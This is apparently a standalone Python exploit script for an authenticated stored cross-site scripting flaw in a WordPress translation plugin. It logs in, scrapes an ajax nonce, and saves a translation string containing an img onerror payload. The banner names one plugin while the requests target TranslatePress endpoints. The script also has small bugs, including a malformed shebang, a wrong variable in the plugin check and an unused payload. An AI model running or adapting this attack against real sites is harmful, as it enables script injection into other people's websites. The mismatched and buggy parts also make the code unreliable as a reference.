#/usr/bin/env python3

import requests
import re
import sys
from termcolor import colored

(banner) = """
__        __            _                           
\ \      / /__  _ __ __| |_ __  _ __ ___  ___ ___  
 \ \ /\ / / _ \| '__/ _` | '_ \| '__/ _ \/ __/ __|
  \ V  V / (_) | | | (_| | |_) | | |  __/\__ \__ \ 
   \_/\_/ \___/|_|  \__,_| .__/|_|  \___||___/___/ 
                         |_| 
Authenticated Stored XSS - Translate WordPress – Google Language Translator    
by https://github.com/apapedulimu                  
"""
print(colored(banner, 'green'))
print(colored("usage : \n======= \npython3 exploit.py http://<IP>:<PORT>/ <Username> <Password>\n",'red'))

payload = "<h1>Hacked By Hacker</h1><img src=x onerror=alert(document.domain)>"
url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]

data = {
	'log':username,
	'pwd':password,
	'wp-submit':'Log In',
	'redirect_to':url+'wp-admin/',
	'testcookie':1
}

r = requests.post(url+'wp-login.php',data=data)

if r.status_code == 200:
	print("[+] Login successful.")
else:
	print("[-] Failed to login.")
	exit(0)
cookies = r.cookies

print("[+] Check Installed Plugin ")
res = requests.get(url+'wp-admin/options-general.php?page=translate-press',cookies=cookies)

if r.status_code == 200:
	print("[+] Plugin Installed.")
else:
	print("[-] Plugin not installed on the website.")
	exit(0)

print("[+] Getting Ajax nonce ... ")

data = {
	'action':'query-attachments',
	'post_id':0,
	'query[item]':43,
	'query[orderby]':'date',
	'query[order]':'DESC',
	'query[posts_per_page]':40,
	'query[paged]':1
}

res = requests.post(url+'wp-admin/admin-ajax.php',data=data, cookies=cookies)
ajax_nonce_list=re.findall(r',"edit":"(\w+)"',res.text)

if res.status_code == 200 and len(ajax_nonce_list) != 0 :
	ajax_nonce = ajax_nonce_list[0]
	print('[+] Ajax Nonce retrieved successfully ! ajax_nonce : '+ ajax_nonce+'\n')
else :
	print("[-] Failed to retrieve ajax_nonce.\n")
	exit(0)
print(res.content)


strings = {"en_US":[{"id":"25","translated":"<h1>asd</h1><img src=x onerror=alert(5)>sss","domain":"twentytwentyone","status":2,"editedTranslation":"<h1>asd</h1><img src=x onerror=alert(5)>sss","original":"Search…"}]}

data = {
	'action':'trp_save_translations_gettext',
    'security': ajax_nonce,
	'strings': strings
}

res = requests.post(url+'wp-admin/admin-ajax.php',data=data, cookies=cookies)


if res.status_code == 200:
	print("[+] Exploit Success.\n[+] Open "+url+"wp-admin/options-general.php?page=google_language_translator")
else:
	print("[-] Exploit Failed.")
	exit(0)
